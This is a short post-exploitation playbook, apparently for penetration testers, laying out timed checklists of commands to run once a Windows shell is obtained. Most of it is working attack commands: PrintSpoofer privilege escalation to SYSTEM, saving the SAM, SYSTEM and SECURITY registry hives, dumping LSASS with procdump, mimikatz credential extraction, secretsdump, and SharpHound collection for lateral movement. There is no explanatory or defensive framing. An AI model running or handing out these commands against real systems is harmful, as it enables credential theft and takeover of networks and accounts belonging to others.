# Playbook: Windows Shell Obtained

## Minute 0: Shell Confirmation

```
[ ] whoami → Confirm user
[ ] hostname → Confirm target
[ ] systeminfo → OS/build/hotfixes
[ ] ipconfig /all → Network interfaces
[ ] netstat -ano → Active connections
[ ] whoami /priv → Privileges (SeImpersonate?)
[ ] whoami /groups → Group membership
```

## Minute 5: Immediate Privilege Escalation Check

```
[ ] whoami /priv → SeImpersonate?
    └── YES → PrintSpoofer.exe -i -c powershell.exe → SYSTEM
[ ] wmic qfe list → Installed patches
[ ] net localgroup administrators → Check admin access
[ ] reg query HKLM\SOFTWARE\Microsoft\Windows\Installer\AlwaysInstallElevated
[ ] wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"
```

## Minute 15: Credential Access

```
[ ] reg save HKLM\SAM sam.hive → SAM dump
[ ] reg save HKLM\SYSTEM system.hive
[ ] reg save HKLM\SECURITY security.hive
[ ] cmdkey /list → Stored credentials
[ ] dir /s web.config 2>nul → Config files
[ ] type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
[ ] dir C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*
```

## Minute 30: Lateral Movement Prep

```
[ ] After SYSTEM/Local Admin:
    [ ] procdump.exe -ma lsass.exe lsass.dmp → LSASS dump
    [ ] mimikatz → sekurlsa::logonpasswords
[ ] net view /domain → Domain hosts
[ ] nslookup domain.local → DC resolution
[ ] arp -a → ARP cache
[ ] route print → Routing table
[ ] net use → Mapped drives
[ ] Upload SharpHound.ps1 → BloodHound collection
```

## Milestone Checks
- [ ] SYSTEM obtained? → LSASS dump immediately
- [ ] SeImpersonate? → PrintSpoofer → SYSTEM in 5 seconds
- [ ] Domain user? → BloodHound
- [ ] Local admin? → Check same creds on other hosts
- [ ] SAM dumped? → secretsdump.py -sam -system LOCAL
